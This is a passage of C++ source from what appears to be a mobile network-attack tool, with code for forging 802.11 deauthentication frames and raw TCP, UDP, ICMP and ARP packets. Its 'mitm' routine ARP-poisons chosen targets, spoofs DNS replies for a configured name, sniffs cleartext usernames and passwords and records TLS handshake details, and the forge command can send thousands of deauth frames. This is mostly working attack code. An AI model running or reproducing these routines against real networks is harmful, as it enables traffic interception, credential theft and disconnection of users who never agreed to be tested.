  out[RADIOTAP_F_LEN + 1] = 0x00;
  out[RADIOTAP_F_LEN + 2] = 0x00;
  putMac(out + RADIOTAP_F_LEN + 4, dest);
  putMac(out + RADIOTAP_F_LEN + 10, bssid);
  putMac(out + RADIOTAP_F_LEN + 16, bssid);
  out[RADIOTAP_F_LEN + 22] = 0x00; out[RADIOTAP_F_LEN + 23] = 0x00;
  out[RADIOTAP_F_LEN + 24] = 0x00; out[RADIOTAP_F_LEN + 25] = 0x00;  // auth alg
  out[RADIOTAP_F_LEN + 26] = 0x00; out[RADIOTAP_F_LEN + 27] = 0x00;  // seq
  out[RADIOTAP_F_LEN + 28] = 0x00; out[RADIOTAP_F_LEN + 29] = 0x00;  // status
  return RADIOTAP_F_LEN + 30;
}

// ------------------------------------------------------------ 802.11 reading
// Reading a captured frame back is the mirror of building one, and the 802.11
// header is deliberately not a fixed layout: the three addresses always sit in
// the order DA, SA, BSSID, but *which* of them is the access point depends on
// the To-DS/From-DS bits. Slicing a fixed offset is the classic way to end up
// labelling a neighbouring network's clients as our own.

static std::string macAt(const unsigned char* p) {
  char b[18];
  snprintf(b, sizeof b, "%02x:%02x:%02x:%02x:%02x:%02x", p[0], p[1], p[2], p[3],
           p[4], p[5]);
  return b;
}

/** Length of the radiotap header the capture starts with, or 0 if there is none. */
static size_t radiotapLen(const unsigned char* p, size_t len) {
  // version, padding, length (little endian). Version is 0; anything else means
  // this is not radiotap and the 802.11 header starts at byte 0.
  if (len < 4 || p[0] != 0x00) return 0;
  size_t rt = (size_t)p[2] | ((size_t)p[3] << 8);
  if (rt < 8 || rt > len) return 0;
  return rt;
}

/** Not all-zero, not broadcast, and unicast: a frame can be addressed to one. */
static bool isUnicastStation(const std::string& mac) {
  if (mac.size() < 17) return false;
  if (mac == "00:00:00:00:00:00") return false;
  unsigned b[6];
  if (sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4],
             &b[5]) != 6)
    return false;
  return (b[0] & 1) == 0;   // I/G bit clear
}

/**
 * The station that sent this frame, when the frame belongs to `bssid`.
 *
 * @return the sender's address, or "" when the frame is not attributable to
 *         this access point. Empty is the right answer far more often than not:
 *         a monitor-mode radio hears every network in range, so most frames that
 *         arrive belong to somebody else's BSSID.
 */
static std::string stationOf80211(const unsigned char* p, size_t len,
                                 const std::string& bssid) {
  size_t off = radiotapLen(p, len);
  const unsigned char* h = p + off;
  size_t hlen = len - off;
  if (hlen < 24) return "";   // shorter than FC+dur+DA+SA+BSSID+seq

  unsigned fc0 = h[0], fc1 = h[1];
  unsigned type = (fc0 >> 2) & 0x3;   // 0 management, 1 control, 2 data
  bool toDs = (fc1 & 0x04) != 0;
  bool fromDs = (fc1 & 0x08) != 0;
  bool wds = (type == 2) && toDs && fromDs;
  // A four-address data frame carries a fourth address the others do not.
  if (wds && hlen < 30) return "";

  std::string want = upper(bssid);
  std::string da = upper(macAt(h + 4));
  std::string sa = upper(macAt(h + 10));
  std::string a3 = upper(macAt(h + 16));
  std::string a4 = wds ? upper(macAt(h + 22)) : std::string();

  if (type == 0) {                       // management: BSSID always in addr3
    if (a3 != want) return "";
    return isUnicastStation(sa) ? lower(sa) : std::string();
  }
  if (type != 2) return "";              // control frames carry no BSSID
  if (wds) {                             // station -> AP -> station (mesh/WDS)
    if (da != want) return "";
    return isUnicastStation(a4) ? lower(a4) : std::string();
  }
  if (toDs) {                            // station -> AP
    if (da != want) return "";
    return isUnicastStation(sa) ? lower(sa) : std::string();
  }
  if (fromDs) {                          // AP -> station
    if (sa != want) return "";
    return isUnicastStation(a3) ? lower(a3) : std::string();
  }
  if (da != want) return "";             // intra-BSS, still through our BSSID
  return isUnicastStation(sa) ? lower(sa) : std::string();
}

// -------------------------------------------------------------------- IP/UDP
static size_t buildUdpIp(const std::string& srcIp, const std::string& dstIp,
                         int sport, int dport, const std::string& payload,
                         unsigned char* out, size_t cap) {
  const size_t ipLen = 20, udpLen = 8;
  size_t plen = payload.size();
  size_t total = ipLen + udpLen + plen;
  if (total > cap) return 0;
  memset(out, 0, total);
  out[0] = 0x45;
  out[1] = 0;
  out[2] = (uint8_t)(total >> 8);
  out[3] = (uint8_t)(total & 0xff);
  out[4] = 0x00; out[5] = 0x01;                 // id
  out[6] = 0x40; out[7] = 0;                    // DF
  out[8] = 64;                                  // ttl
  out[9] = 17;                                  // UDP
  struct in_addr s{}, d{};
  inet_pton(AF_INET, srcIp.c_str(), &s);
  inet_pton(AF_INET, dstIp.c_str(), &d);
  memcpy(out + 12, &s.s_addr, 4);
  memcpy(out + 16, &d.s_addr, 4);
  uint16_t ck = cksum(out, ipLen, 0);
  out[10] = (uint8_t)(ck >> 8); out[11] = (uint8_t)(ck & 0xff);

  unsigned char* u = out + ipLen;
  u[0] = (uint8_t)(sport >> 8); u[1] = (uint8_t)(sport & 0xff);
  u[2] = (uint8_t)(dport >> 8); u[3] = (uint8_t)(dport & 0xff);
  u[4] = (uint8_t)((udpLen + plen) >> 8);
  u[5] = (uint8_t)((udpLen + plen) & 0xff);
  // A zero UDP checksum is legal for IPv4 and keeps the frame byte-exact.
  u[6] = 0; u[7] = 0;
  if (plen) memcpy(u + udpLen, payload.data(), plen);
  return total;
}

// TCP/IPv4 with a pseudo-header checksum. A SYN (or any flag combination) can
// be produced by combining the flags into one byte and letting the caller pick
// seq/ack.
static size_t buildTcpIp(const std::string& srcIp, const std::string& dstIp,
                         int sport, int dport, uint32_t seq, uint32_t ack,
                         uint8_t flags, const std::string& payload,
                         unsigned char* out, size_t cap) {
  const size_t ipLen = 20, tcpLen = 20;
  size_t plen = payload.size();
  size_t total = ipLen + tcpLen + plen;
  if (total > cap) return 0;
  memset(out, 0, total);

  out[0] = 0x45;
  out[2] = (uint8_t)(total >> 8);
  out[3] = (uint8_t)(total & 0xff);
  out[4] = 0x00; out[5] = 0x03;                 // id
  out[6] = 0x40;                               // DF
  out[8] = 64;                                 // ttl
  out[9] = 6;                                  // TCP
  struct in_addr s{}, d{};
  inet_pton(AF_INET, srcIp.c_str(), &s);
  inet_pton(AF_INET, dstIp.c_str(), &d);
  memcpy(out + 12, &s.s_addr, 4);
  memcpy(out + 16, &d.s_addr, 4);
  uint16_t ck = cksum(out, ipLen, 0);
  out[10] = (uint8_t)(ck >> 8); out[11] = (uint8_t)(ck & 0xff);

  unsigned char* t = out + ipLen;
  t[0] = (uint8_t)(sport >> 8); t[1] = (uint8_t)(sport & 0xff);
  t[2] = (uint8_t)(dport >> 8); t[3] = (uint8_t)(dport & 0xff);
  t[4] = (uint8_t)(seq >> 24); t[5] = (uint8_t)(seq >> 16);
  t[6] = (uint8_t)(seq >> 8);  t[7] = (uint8_t)seq;
  t[8] = (uint8_t)(ack >> 24); t[9] = (uint8_t)(ack >> 16);
  t[10] = (uint8_t)(ack >> 8); t[11] = (uint8_t)ack;
  t[12] = 0x50;                                // data offset 5 words, no options
  t[13] = flags;
  t[14] = 0xFF; t[15] = 0xFF;                  // window 65535
  if (plen) memcpy(t + tcpLen, payload.data(), plen);

  // TCP checksum covers the pseudo-header + TCP header + payload.
  uint32_t sum = 0;
  auto add16 = [&](const uint8_t* p, size_t n) {
    while (n > 1) { sum += (p[0] << 8) | p[1]; p += 2; n -= 2; }
    if (n) sum += p[0] << 8;
  };
  add16((const uint8_t*)&s.s_addr, 4);
  add16((const uint8_t*)&d.s_addr, 4);
  sum += 6;                                    // protocol
  sum += (uint32_t)(tcpLen + plen);
  uint16_t tc = cksum(t, tcpLen + plen, sum);
  t[16] = (uint8_t)(tc >> 8); t[17] = (uint8_t)(tc & 0xff);
  return total;
}

static size_t buildIcmpIp(const std::string& srcIp, const std::string& dstIp,
                          int type, int code, const std::string& payload,
                          unsigned char* out, size_t cap) {
  const size_t ipLen = 20, icmpLen = 8;
  size_t plen = payload.size();
  size_t total = ipLen + icmpLen + plen;
  if (total > cap) return 0;
  memset(out, 0, total);
  out[0] = 0x45;
  out[2] = (uint8_t)(total >> 8);
  out[3] = (uint8_t)(total & 0xff);
  out[4] = 0x00; out[5] = 0x02;
  out[6] = 0x40;
  out[8] = 64;
  out[9] = 1;                                     // ICMP
  struct in_addr s{}, d{};
  inet_pton(AF_INET, srcIp.c_str(), &s);
  inet_pton(AF_INET, dstIp.c_str(), &d);
  memcpy(out + 12, &s.s_addr, 4);
  memcpy(out + 16, &d.s_addr, 4);
  uint16_t ck = cksum(out, ipLen, 0);
  out[10] = (uint8_t)(ck >> 8); out[11] = (uint8_t)(ck & 0xff);

  unsigned char* i = out + ipLen;
  i[0] = (uint8_t)type;
  i[1] = (uint8_t)code;
  i[2] = 0; i[3] = 0;
  if (plen) memcpy(i + icmpLen, payload.data(), plen);
  uint16_t c2 = cksum(i, icmpLen + plen, 0);
  i[2] = (uint8_t)(c2 >> 8); i[3] = (uint8_t)(c2 & 0xff);
  return total;
}

static size_t buildArpProbe(const std::string& ethSrc, uint32_t senderIp,
                            uint32_t targetIp, unsigned char* out) {
  // "who has X? tell <my-ip>" — lets a root process learn a MAC that the
  // unprivileged /proc/net/arp view hides.
  return buildArp(ethSrc, "ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", senderIp,
                  targetIp, 1, out);
}

// Sends an ARP probe and waits for the matching reply. `out` receives the
// responder's MAC, or an empty string on timeout.
static std::string resolveMac(Raw& raw, uint32_t targetIp, uint32_t myIpN) {
  unsigned char frame[64], rx[2048];
  size_t flen = buildArpProbe(macOf(raw.ifname), myIpN, targetIp, frame);
  if (!raw.sendL2(frame, flen, "ff:ff:ff:ff:ff:ff", 0)) return "";
  for (int i = 0; i < 12; i++) {
    if (!raw.recvL2(rx, sizeof rx, 250)) break;
    if (ntohs(((uint16_t*)rx)[12]) != ETH_P_ARP) continue;
    uint32_t spa;
    memcpy(&spa, rx + 28, 4);
    if (spa != targetIp) continue;
    unsigned char* a = rx + 22;
    char b[18];
    snprintf(b, sizeof b, "%02x:%02x:%02x:%02x:%02x:%02x", a[0], a[1], a[2], a[3],
             a[4], a[5]);
    return b;
  }
  return "";
}

// Wraps a bare IP packet in an Ethernet header. Forging at layer 2 (rather
// than SOCK_RAW) keeps the IP header and its checksum exactly as built here.
static size_t buildEthIp(const std::string& ethSrc, const std::string& ethDst,
                         const unsigned char* ip, size_t iplen, unsigned char* out,
                         size_t cap) {
  size_t total = 14 + iplen;
  if (total > cap) return 0;
  memset(out, 0, total);
  putMac(out, ethDst);
  putMac(out + 6, ethSrc);
  out[12] = 0x08;   // ETHERTYPE_IP
  out[13] = 0x00;
  memcpy(out + 14, ip, iplen);
  return total;
}

// ------------------------------------------------------------------- cmds
static void jsonCaps(const std::string& ifn) {
  Raw r;
  r.ifname = ifn;
  bool pk = r.openPacket();
  Raw r2;
  r2.ifname = ifn;
  bool raw = r2.openRawIp(255);
  std::string iw;
  runCmd("command -v iw", iw);
  bool monitor = isMonitorMode(ifn);
  std::string ip = ifaceIp(ifn);
  std::string mask = ifaceMask(ifn);
  std::string o = "{\"type\":\"caps\",\"iface\":" + J(ifn) +
                  ",\"packetSocket\":" + (pk ? "true" : "false") +
                  ",\"rawIpSocket\":" + (raw ? "true" : "false") +
                  ",\"monitorMode\":" + (monitor ? "true" : "false") +
                  ",\"mac\":" + J(macOf(ifn)) +
                  ",\"ip\":" + J(ip) + ",\"netmask\":" + J(mask) +
                  ",\"cidr\":" + J(ip + "/" + std::to_string(netmaskToPrefix(mask))) +
                  ",\"gateway\":" + J(defaultGateway()) +
                  ",\"hasIw\":" + (iw.empty() ? "false" : "true") +
                  ",\"uid\":" + std::to_string(getuid()) + "}";
  emit(o);
  if (!pk)  emit("{\"type\":\"warn\",\"msg\":" + J(std::string("AF_PACKET open failed: ") + strerror(errno)) + "}");
  if (!raw) emit("{\"type\":\"warn\",\"msg\":" + J(std::string("SOCK_RAW open failed: ") + strerror(errno)) + "}");
}

// mitm <iface> <targetIpsCsv> <intervalMs> — loop until SIGTERM
static void cmdMitm(const std::string& ifn, const std::string& targetsCsv,
                    int intervalMs, const std::string& spoofName,
                    const std::string& spoofIp) {
  Raw raw;
  raw.ifname = ifn;
  if (!raw.openPacket()) {
    emit("{\"type\":\"error\",\"msg\":" +
         J(std::string("AF_PACKET unavailable: ") + strerror(errno)) + "}");
    return;
  }
  std::string myIp = ifaceIp(ifn);
  std::string myMac = macOf(ifn);
  std::string gw = defaultGateway();
  struct in_addr a{};
  if (inet_pton(AF_INET, myIp.c_str(), &a) != 1) {
    emit("{\"type\":\"error\",\"msg\":\"cannot determine local IPv4 address\"}");
    return;
  }
  uint32_t myIpN = a.s_addr;
  uint32_t gwN = 0;
  if (!gw.empty() && inet_pton(AF_INET, gw.c_str(), &a) == 1) gwN = a.s_addr;

  signal(SIGINT, onSig);
  signal(SIGTERM, onSig);

  emit("{\"type\":\"mitmStarted\",\"iface\":" + J(ifn) + ",\"ip\":" + J(myIp) +
       ",\"mac\":" + J(myMac) + ",\"gateway\":" + J(gw) +
       ",\"targets\":" + std::to_string((long long)split(targetsCsv, ',').size()) +
       ",\"intervalMs\":" + std::to_string(intervalMs) +
       ",\"spoof\":" + J(spoofName) + ",\"spoofIp\":" + J(spoofIp) + "}");

  unsigned char frame[64];
  unsigned char rx[2048];
  (void)rx;
  long long sent = 0, flows = 0, credsFound = 0, spoofed = 0, tlsFound = 0,
                 lastReport = nowMs();
  std::string lastGw = "";
  // Flow reporting is rate-limited and then capped. The observation pass is a
  // tight loop over a raw packet socket, so on a busy link it can emit one JSON
  // line per packet indefinitely; every one of those crosses the JNI boundary
  // and becomes a row in a LinearLayout, which grows the view tree without
  // limit until the app is killed. The counter is kept exact and reported, so
  // the UI can say that the list was truncated rather than implying the device
  // was that quiet.
  const long long kFlowEmitMax = 400;
  long long flowEmitted = 0;
  long long lastFlowEmit = 0;
  const long long kFlowEmitIntervalMs = 250;

  // One sniffer for the whole session. It holds the per-connection windows
  // that let a credential split across two packets still be recognised, so it
  // has to outlive the individual packets; making it a local inside the capture
  // loop would reset that state several times a second.
  CredSniffer sniffer;
  // Same reasoning as the sniffer above: the TLS analyser keeps one buffer per
  // direction of a connection so a ClientHello or Certificate split across
  // segments still parses, so it has to live for the whole session.
  TlsAnalyzer tls;

  while (!g_stop) {
    // 1) learn the gateway MAC with an ARP probe (root-only kernel would
    //    otherwise hide it from us)
    if (lastGw.empty() && gwN) {
      lastGw = resolveMac(raw, gwN, myIpN);
      if (!lastGw.empty())
        emit("{\"type\":\"gatewayMac\",\"mac\":" + J(lastGw) + "}");
    }
    // 2) poison: claim the gateway IP for each target
    if (lastGw.empty()) {
      emit("{\"type\":\"error\",\"msg\":\"could not resolve the gateway MAC; "
           "is this device actually on the default route?\"}");
      return;
    }
    for (auto& t : split(targetsCsv, ',')) {
      std::string ip = trim(t);
      if (ip.empty()) continue;
      struct in_addr ti{};
      if (inet_pton(AF_INET, ip.c_str(), &ti) != 1) continue;
      size_t n = buildArp(myMac, "ff:ff:ff:ff:ff:ff", lastGw, gwN, ti.s_addr, 2,
                          frame);
      if (raw.sendL2(frame, n, "ff:ff:ff:ff:ff:ff", 0)) sent++;
    }
    // 3) observe traffic that involves us, to give the UI something to show
    for (int k = 0; k < 4 && !g_stop; k++) {
      if (!raw.recvL2(rx, sizeof rx, 60)) break;
      if (ntohs(((uint16_t*)rx)[12]) != ETH_P_IP) continue;
      const unsigned char* ip = rx + 14;
      if ((ip[0] >> 4) != 4) continue;                 // IPv4 only
      int ihl = (ip[0] & 0x0F) * 4;
      if (ihl < 20) continue;
      int tot = (ip[2] << 8) | ip[3];
      if (tot < ihl + 4) continue;
      struct in_addr saddr{}, daddr{};
      memcpy(&saddr.s_addr, ip + 12, 4);
      memcpy(&daddr.s_addr, ip + 16, 4);
      char sb[INET_ADDRSTRLEN], db[INET_ADDRSTRLEN];
      inet_ntop(AF_INET, &saddr, sb, sizeof sb);
      inet_ntop(AF_INET, &daddr, db, sizeof db);
      int proto = ip[9];
      int dport = 0, sport = 0;
      int payloadAt = 0, payloadLen = 0;
      if (proto == 6 || proto == 17) {
        uint16_t sp, dp;
        memcpy(&sp, rx + 14 + ihl, 2);
        memcpy(&dp, rx + 14 + ihl + 2, 2);
        sport = ntohs(sp);
        dport = ntohs(dp);
        if (proto == 6) {
          // The TCP data offset is the top nibble of byte 12, so the payload
          // starts after the options, not after the fixed 20-byte header.
          int doff = (rx[14 + ihl + 12] >> 4) * 4;
          if (doff < 20) continue;
          payloadAt = 14 + ihl + doff;
          payloadLen = tot - ihl - doff;
        } else {
          int ulen = (rx[14 + ihl + 4] << 8) | rx[14 + ihl + 5];
          payloadAt = 14 + ihl + 8;
          // The UDP length covers the header too, and may disagree with the IP
          // total when a packet was padded; the smaller of the two is the
          // payload that is really there.
          payloadLen = (ulen > 8 ? ulen - 8 : 0);
          if (payloadLen > tot - ihl - 8) payloadLen = tot - ihl - 8;
        }
        if (payloadLen < 0) payloadLen = 0;
        if (payloadAt + payloadLen > (int)sizeof rx)
          payloadLen = (int)sizeof rx - payloadAt;
      }
      static const char* kP[] = {"tcp", "udp", "icmp", "igmp", "ggp"};
      flows++;

      // DNS spoofing, while we are the gateway in the victim's ARP cache.
      // A query for the configured name is answered immediately from the real
      // resolver's address, so the poisoned answer reaches the client ahead of
      // the genuine one. The reply is addressed to the source MAC of the frame
      // we are holding, which is the host that asked -- no ARP lookup needed.
      if (!spoofName.empty() && payloadLen >= 12 &&
          (dport == 53 || sport == 53)) {
        DnsQuery q;
        if (q.parse(rx + payloadAt, (size_t)payloadLen) &&
            q.qtype == 1 && dnsNameMatches(q.name, spoofName)) {
          // Borrow the resolver the client actually asked: the gateway on a
          // normal network, but a dedicated resolver where there is one. The
          // client compares source addresses against expected replies, so
          // answering from ourselves would be dropped.
          std::string resolver = !gw.empty() ? gw : db;
          std::string victim = (sport == 53) ? sb : db;
          std::vector<uint8_t> msg;
          if (buildDnsAnswer(q, rx + payloadAt, (size_t)payloadLen, spoofIp,
                             &msg)) {
            std::string payload(msg.begin(), msg.end());
            unsigned char out[1500];
            size_t n = buildUdpIp(resolver, victim, 53, sport, payload, out,
                                  sizeof out);
            if (n) {
              memcpy(out, rx, 12);   // dest mac = the asking host
              putMac(out + 6, myMac); // src mac = us, the forged gateway
              if (raw.sendL2(out, n, frameSrcMac(rx), ETH_P_IP)) spoofed++;
            }
          }
        }
      }

      if (payloadAt && payloadLen > 0) {
        // TLS is analysed before the credential parsers, and only on TCP: the
        // handshake is a TLS record stream, and handing UDP bytes to the record
        // reader would resync one byte at a time for nothing.
        if (proto == 6) {
          TlsFinding t;
          if (tls.feed(sport, dport, std::string(sb), std::string(db),
                       rx + payloadAt, (size_t)payloadLen, &t)) {
            tlsFound++;
            if (t.kind == "hello") {
              emit("{\"type\":\"tlsHello\",\"src\":" + J(t.src) + ",\"dst\":" +
                   J(t.dst) + ",\"sni\":" + J(t.serverName) + ",\"alpn\":" +
                   J(t.alpn) + ",\"offered\":" + J(t.offered) + ",\"weak\":" +
                   (tlsRank(t.offered) < tlsRank("TLSv1.2") ? "true" : "false") +
                   "}");
            } else {
              emit("{\"type\":\"tlsCert\",\"src\":" + J(t.src) + ",\"dst\":" +
                   J(t.dst) + ",\"subject\":" + J(t.subject) + ",\"issuer\":" +
                   J(t.issuer) + ",\"notBefore\":" + J(t.notBefore) +
                   ",\"notAfter\":" + J(t.notAfter) + ",\"selfSigned\":" +
                   (t.selfSigned ? "true" : "false") + ",\"expired\":" +
                   (t.expired ? "true" : "false") + ",\"notYetValid\":" +
                   (t.notYetValid ? "true" : "false") + ",\"weakKey\":" +
                   (t.weakKey ? "true" : "false") + ",\"negotiated\":" +
                   J(t.negotiated) + "}");
            }
          }
        }

        Cred cred;
        if (sniffer.feed(proto, sport, dport, std::string(sb), std::string(db),
                        rx + payloadAt, (size_t)payloadLen, &cred)) {
          std::string m = "{\"type\":\"cred\",\"proto\":" + J(cred.proto) +
                          ",\"src\":" + J(cred.src) + ",\"dst\":" + J(cred.dst) +
                          ",\"dport\":" + std::to_string(cred.dport) +
                          ",\"user\":" + J(cred.user) + ",\"pass\":" +
                          J(cred.pass) + ",\"challenge\":" +
                          (cred.challenge ? "true" : "false") + "}";
          emit(m);
          credsFound++;
        }
      }
      long long now = nowMs();
      if (flowEmitted < kFlowEmitMax && now - lastFlowEmit >= kFlowEmitIntervalMs) {
        lastFlowEmit = now;
        flowEmitted++;
        emit("{\"type\":\"flow\",\"src\":" + J(std::string(sb)) + ",\"dst\":" +
             J(std::string(db)) + ",\"proto\":" +
             J(proto < 5 ? kP[proto] : std::to_string(proto)) + ",\"dport\":" +
             std::to_string(dport) + "}");
      }
    }
    long long t = nowMs();
    if (t - lastReport > 2000) {
      emit("{\"type\":\"mitmStats\",\"arpSent\":" + std::to_string(sent) +
           ",\"flows\":" + std::to_string(flows) + ",\"shown\":" +
           std::to_string(flowEmitted) + ",\"creds\":" +
           std::to_string(credsFound) + ",\"gatewayMac\":" +
           J(lastGw) + "}");
      lastReport = t;
    }
    if (intervalMs < 10) intervalMs = 10;
    usleep((useconds_t)intervalMs * 1000);
  }
  // 4) repair: send a correct ARP entry for the gateway
  for (auto& t : split(targetsCsv, ',')) {
    std::string ip = trim(t);
    if (ip.empty()) continue;
    struct in_addr ti{};
    if (inet_pton(AF_INET, ip.c_str(), &ti) != 1) continue;
    size_t n = buildArp(lastGw, "ff:ff:ff:ff:ff:ff", myMac, gwN, ti.s_addr, 2,
                        frame);
    raw.sendL2(frame, n, "ff:ff:ff:ff:ff:ff", 0);
  }
  emit("{\"type\":\"mitmStopped\",\"arpSent\":" + std::to_string(sent) +
       ",\"flows\":" + std::to_string(flows) + ",\"shown\":" +
       std::to_string(flowEmitted) + ",\"creds\":" + std::to_string(credsFound) +
       ",\"spoofed\":" + std::to_string(spoofed) + ",\"tls\":" +
       std::to_string(tlsFound) + ",\"restored\":true}");
}

// restore <iface> <targetIpsCsv> — put the real gateway entry back
static void cmdRestore(const std::string& ifn, const std::string& targetsCsv) {
  Raw raw;
  raw.ifname = ifn;
  if (!raw.openPacket()) {
    emit("{\"type\":\"error\",\"msg\":" +
         J(std::string("AF_PACKET unavailable: ") + strerror(errno)) + "}");
    return;
  }
  std::string myMac = macOf(ifn);
  std::string gw = defaultGateway();
  struct in_addr a{};
  if (gw.empty() || inet_pton(AF_INET, gw.c_str(), &a) != 1) {
    emit("{\"type\":\"error\",\"msg\":\"no default gateway to restore\"}");
    return;
  }
  uint32_t gwN = a.s_addr;
  std::string gwMac;
  std::string myIp = ifaceIp(ifn);
  struct in_addr m{};
  if (myIp.empty() || inet_pton(AF_INET, myIp.c_str(), &m) != 1) {
    emit("{\"type\":\"error\",\"msg\":\"cannot determine local IPv4 address\"}");
    return;
  }
  for (int tries = 0; tries < 4 && gwMac.empty(); tries++) gwMac = resolveMac(raw, gwN, m.s_addr);
  if (gwMac.empty()) {
    emit("{\"type\":\"error\",\"msg\":\"could not resolve the gateway MAC\"}");
    return;
  }
  unsigned char frame[64];
  int n = 0;
  for (auto& t : split(targetsCsv, ',')) {
    std::string ip = trim(t);
    struct in_addr ti{};
    if (ip.empty() || inet_pton(AF_INET, ip.c_str(), &ti) != 1) continue;
    size_t l = buildArp(gwMac, "ff:ff:ff:ff:ff:ff", myMac, gwN, ti.s_addr, 2, frame);
    if (raw.sendL2(frame, l, "ff:ff:ff:ff:ff:ff", 0)) n++;
  }
  emit("{\"type\":\"restored\",\"count\":" + std::to_string(n) + ",\"gatewayMac\":" +
       J(gwMac) + "}");
}

// forge <iface> <type> <k=v,k=v,...> — build and inject frames
// type: arp | udp | icmp | deauth | auth
static void cmdForge(const std::string& ifn, const std::string& type,
                     const std::string& kvs) {
  std::vector<std::string> pairs = split(kvs, ',');
  auto get = [&](const char* k, const std::string& dflt) -> std::string {
    for (auto& p : pairs) {
      auto kv = split(p, '=');
      if (kv.size() == 2 && trim(kv[0]) == k) return trim(kv[1]);
    }
    return dflt;
  };
  auto num = [&](const char* k, int dflt) {
    std::string v = get(k, "");
    return v.empty() ? dflt : atoi(v.c_str());
  };

  std::string myMac = macOf(ifn);
  std::string myIp = ifaceIp(ifn);
  int count = num("count", 1);
  int pps = num("pps", 50);
  if (count < 1) count = 1;
  if (count > 20000) count = 20000;
  if (pps < 1) pps = 1;
  if (pps > 5000) pps = 5000;

  Raw raw;
  raw.ifname = ifn;
  unsigned char frame[128];
  size_t flen = 0;
  std::string desc;

  if (type == "arp") {
    if (!raw.openPacket()) {
      emit("{\"type\":\"error\",\"msg\":" +
           J(std::string("AF_PACKET unavailable: ") + strerror(errno)) + "}");
      return;
    }
    std::string targetIp = get("targetIp", defaultGateway());
    std::string targetMac = get("targetMac", "ff:ff:ff:ff:ff:ff");
    int op = num("op", 2);
    struct in_addr s{}, t{};
    inet_pton(AF_INET, (myIp.empty() ? "0.0.0.0" : myIp).c_str(), &s);
    inet_pton(AF_INET, targetIp.c_str(), &t);
    flen = buildArp(myMac, "ff:ff:ff:ff:ff:ff", targetMac, s.s_addr, t.s_addr,
                    (uint16_t)op, frame);
    desc = "ARP op=" + std::to_string(op) + " " + myIp + "(" + myMac + ") -> " +
           targetIp + "(" + targetMac + ")";
  } else if (type == "udp" || type == "icmp" || type == "tcp") {
    if (!raw.openPacket()) {
      emit("{\"type\":\"error\",\"msg\":" +
           J(std::string("AF_PACKET unavailable: ") + strerror(errno)) + "}");
      return;
    }
    std::string src = get("srcIp", myIp);
    std::string dst = get("dstIp", defaultGateway());
    std::string payload = get("payload", "zerosploit");
    unsigned char ip[128];
    size_t iplen = 0;
    int sport = num("sport", 40000), dport = num("dport", 53);
    if (type == "udp")
      iplen = buildUdpIp(src, dst, sport, dport, payload, ip, sizeof ip);
    else if (type == "icmp")
      iplen = buildIcmpIp(src, dst, num("icmpType", 8), num("icmpCode", 0), payload,
                          ip, sizeof ip);
    else
      iplen = buildTcpIp(src, dst, sport, dport, (uint32_t)num("seq", 1000),
                         (uint32_t)num("ack", 0), (uint8_t)num("flags", 2), payload,
                         ip, sizeof ip);
    if (!iplen) {
      emit("{\"type\":\"error\",\"msg\":\"failed to build IP packet\"}");
      return;
    }
    // Next-hop MAC: explicit override, else ask the wire, else broadcast.
    std::string dstMac = get("dstMac", "");
    if (dstMac.empty()) {
      struct in_addr d{}, m{};
      if (inet_pton(AF_INET, dst.c_str(), &d) == 1) {
        inet_pton(AF_INET, (myIp.empty() ? "0.0.0.0" : myIp).c_str(), &m);
        dstMac = resolveMac(raw, d.s_addr, m.s_addr);
      }
    }
    if (dstMac.empty()) dstMac = "ff:ff:ff:ff:ff:ff";
    flen = buildEthIp(myMac, dstMac, ip, iplen, frame, sizeof frame);
    std::string flagnames;
    if (type == "tcp") {
      int f = num("flags", 2);
      flagnames = " [";
      if (f & 0x02) flagnames += "S";
      if (f & 0x10) flagnames += "A";
      if (f & 0x01) flagnames += "F";
      if (f & 0x08) flagnames += "P";
      if (f & 0x04) flagnames += "R";
      flagnames += "] seq=" + std::to_string(num("seq", 1000));
    }
    desc = upper(type) + " " + src + ":" + std::to_string(sport) + " -> " + dst +
           ":" + std::to_string(dport) + flagnames + " (" +
           std::to_string(payload.size()) + "B) via " + dstMac;
  } else if (type == "deauth" || type == "auth") {
    if (!raw.openPacket()) {
      emit("{\"type\":\"error\",\"msg\":" +
           J(std::string("AF_PACKET unavailable: ") + strerror(errno)) + "}");
      return;
    }
    if (!isMonitorMode(ifn)) {
      emit("{\"type\":\"error\",\"code\":\"NOT_MONITOR\","
           "\"msg\":" + J("interface " + ifn +
                        " is not in monitor mode — injection is impossible") + "}");
      return;
    }
    std::string bssid = get("bssid", "");
    std::string dest = get("dest", "ff:ff:ff:ff:ff:ff");
    if (bssid.empty()) {
      emit("{\"type\":\"error\",\"msg\":\"bssid is required\"}");
      return;
    }
    if (type == "deauth")
      flen = build80211Deauth(bssid, dest, (uint8_t)num("reason", 7), frame);
    else
      flen = build80211Auth(bssid, dest, frame);
    desc = upper(type) + " -> " + bssid + " (" + std::to_string(flen) + "B frame)";
  } else {
    emit("{\"type\":\"error\",\"msg\":" + J("unknown frame type " + type) + "}");
    return;
  }
  if (!flen) {
    emit("{\"type\":\"error\",\"msg\":\"failed to build frame\"}");
    return;
  }

  emit("{\"type\":\"forgeInfo\",\"iface\":" + J(ifn) + ",\"kind\":" + J(type) +
       ",\"desc\":" + J(desc) + ",\"len\":" + std::to_string(flen) +
       ",\"hex\":" + J(hexOf(frame, flen)) +
       ",\"count\":" + std::to_string(count) + ",\"pps\":" + std::to_string(pps) + "}");

  int intervalUs = 1000000 / pps;
  int sent = 0;
  for (int i = 0; i < count && !g_stop; i++) {
    bool ok = (type == "deauth" || type == "auth")
                  ? raw.sendL2(frame, flen, "ff:ff:ff:ff:ff:ff",
                               ETH_P_IEEE80211_RADIOTAP)
                  : raw.sendL2(frame, flen, "ff:ff:ff:ff:ff:ff", 0);
    if (ok) sent++;
    if (i % 50 == 0)
      emit("{\"type\":\"forgeProgress\",\"sent\":" + std::to_string(sent) +
           ",\"total\":" + std::to_string(count) + "}");
    if (intervalUs > 0) usleep((useconds_t)intervalUs);
  }
  emit("{\"type\":\"forgeDone\",\"kind\":" + J(type) + ",\"sent\":" +
       std::to_string(sent) + ",\"requested\":" + std::to_string(count) + "}");
}

// The address the client list showed -> the station holding it right now.
//
// The IP is what the user picked, but a deauthentication frame has to name a
// MAC, and the two can drift: between listing the clients and pressing the
// button the address can be reassigned to a different station. Resolving here,
// at kick time, is what keeps the two tied together -- the frame goes to
// whoever owns that address now. An address nobody owns is reported back
// rather than turned into a deauth aimed at the wrong client.
static std::string resolveMacForIp(const std::string& ip) {
  for (auto& p : readArpPairs())
    if (p.first == ip) return p.second;
